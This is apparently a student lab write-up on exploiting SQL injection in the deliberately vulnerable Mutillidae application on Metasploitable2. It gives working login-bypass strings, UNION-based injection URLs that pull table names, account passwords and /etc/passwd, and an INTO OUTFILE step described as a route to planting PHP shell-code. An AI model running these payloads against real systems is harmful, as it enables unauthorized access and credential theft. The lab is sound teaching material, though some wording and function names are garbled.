# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### Note
```bash
Change Your IP Where the <192.168.43.145> Enter Your IP Addr
```

## EXECUTION STEPS AND ITS OUTPUT:
- SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

- Identify IP address using ifconfig in Metasploitable2

<img width="1036" height="515" alt="Screenshot 2025-10-24 141103" src="https://github.com/user-attachments/assets/98815b6b-4fde-4b7f-88eb-df57532420af" />



- Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

<img width="1035" height="521" alt="Screenshot 2025-10-24 141132" src="https://github.com/user-attachments/assets/7d9708fa-8ca9-4707-b732-4409ed69935b" />


- Select Multidae from the menu listed as shown above. You will get the page as displayed below:

<img width="1035" height="480" alt="Screenshot 2025-10-24 140926" src="https://github.com/user-attachments/assets/0485d14b-4859-45b6-aadd-2b8bc16264e7" />


- Click on the menu Login/Register and register for an account

- <img width="1919" height="1035" alt="Screenshot 2025-10-24 135558" src="https://github.com/user-attachments/assets/c0d81b22-33de-452e-9821-8b61235d2503" />



- Click on the link “Please register here”
<img width="1919" height="1034" alt="Screenshot 2025-10-24 140844" src="https://github.com/user-attachments/assets/524ae390-f684-4db9-8d55-53ece6c09531" />


- Click on “Create Account” to display the following page:

<img width="1918" height="1028" alt="Screenshot 2025-10-24 135529" src="https://github.com/user-attachments/assets/a4a0cb5d-3ba5-42a7-a75e-9cbbff2cda45" />


- The login structure we will use in our examples is straightforward. 

- It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
- 
```
($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
```

- For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

<img width="1919" height="1035" alt="Screenshot 2025-10-24 135558" src="https://github.com/user-attachments/assets/0c227f19-3b5b-4ad5-9586-1a9b2b7c73c5" />


- Click “Login”. The logged in page will show as below:

<img width="1034" height="693" alt="Screenshot 2025-10-24 140911" src="https://github.com/user-attachments/assets/bf370d7f-e260-425f-8b9a-6dfb48372633" />



## Bypassing login field
- The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

- Now after logging out you will see the login page. In the login page give ganesh’ # .

- You can see the page now enters into the administrator page as before when giving the password.

<img width="1919" height="1035" alt="Screenshot 2025-10-24 135558" src="https://github.com/user-attachments/assets/206facb6-72f7-4e18-9332-d1c28641e50d" />


- Click the login button and you will see it enter into the administrator page.



## Union-based SQL injection
- UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

- After logging out, Now choose the menu as shown below:




<img width="1035" height="480" alt="Screenshot 2025-10-24 140926" src="https://github.com/user-attachments/assets/fbcb5861-0332-45de-b765-7e4f93d92a99" />

<img width="1034" height="323" alt="Screenshot 2025-10-24 141648" src="https://github.com/user-attachments/assets/fddb9aa6-7bb2-406f-a20d-1f79bc3e2a68" />


<img width="1919" height="1035" alt="Screenshot 2025-10-24 135558" src="https://github.com/user-attachments/assets/c1827e43-dfcd-4ff2-a947-c541ab122e3a" />


- From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

<img width="1027" height="404" alt="Screenshot 2025-10-24 142123" src="https://github.com/user-attachments/assets/4fd0c3ef-52b1-41af-9076-7cb143950cf3" />



- Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

- The browser url of this info page need to be modified with the url as below:
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
```


- After adding the order by 6 into the existing url , the following error statement will be obtained:


- When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

- As it is having 5 columns the query worked fine and it provides the correct result


- Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union


- As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.


- Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
```
- The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

- Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
```

- The url once executed will retrieve table names from the “owasp 10” database.

<img width="991" height="418" alt="Screenshot 2025-10-24 142248" src="https://github.com/user-attachments/assets/bfbf0e6b-6338-4a94-aeaf-6aa552d6571a" />


## Extracting sensitive data such as passwords
- When the attacker knows table names, he needs to discover what the column names are to extract data.

- In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

- Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

- Here we are trying to extract column names from the “accounts” table.




- The column names of the accounts is displayed below for the following url:
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
```

- Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

<img width="991" height="418" alt="Screenshot 2025-10-24 142248" src="https://github.com/user-attachments/assets/e1d170f7-2fbf-4698-89e3-f9731e73362e" />


## Ex: (union select 1,username,password,is_admin,5 from accounts).
```
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
```

- Reading and writing files on the web-server
- We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

## Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
```
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
```

- the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion.

- we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. 

- This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. 

<img width="991" height="418" alt="Screenshot 2025-10-24 142248" src="https://github.com/user-attachments/assets/00003da5-d80c-4b0a-9471-615f0e08adea" />


Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

<img width="1074" height="519" alt="Screenshot 2025-10-24 142436" src="https://github.com/user-attachments/assets/3a78c98d-7daf-4a4d-8d17-6ace4d735b2b" />


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
